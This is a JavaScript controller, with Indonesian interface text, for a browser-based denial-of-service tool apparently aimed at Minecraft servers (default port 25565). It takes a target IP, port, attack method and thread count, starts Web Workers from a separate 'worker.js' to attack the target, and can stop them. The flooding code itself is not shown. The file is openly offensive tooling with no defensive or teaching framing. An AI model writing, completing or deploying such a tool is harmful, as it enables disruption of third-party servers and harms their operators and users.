let workers = [];

function startAttack() {
    let serverIP = document.getElementById("serverIP").value;
    let serverPort = document.getElementById("serverPort").value || 25565;
    let attackMethod = document.getElementById("attackMethod").value;
    let threadCount = parseInt(document.getElementById("threadCount").value) || 5;
    let statusDiv = document.getElementById("status");

    if (!serverIP || !serverPort || threadCount <= 0) {
        alert("Masukkan IP, Port, dan jumlah thread yang valid!");
        return;
    }

    statusDiv.innerHTML = `Menyerang ${serverIP}:${serverPort} dengan ${attackMethod} menggunakan ${threadCount} thread`;

    stopAttack(); // Hentikan serangan sebelumnya jika ada

    for (let i = 0; i < threadCount; i++) {
        let worker = new Worker("worker.js");
        worker.postMessage({ serverIP, serverPort, attackMethod });
        workers.push(worker);
    }
}

function stopAttack() {
    workers.forEach(worker => worker.terminate());
    workers = [];
    document.getElementById("status").innerHTML = "Serangan dihentikan!";
}
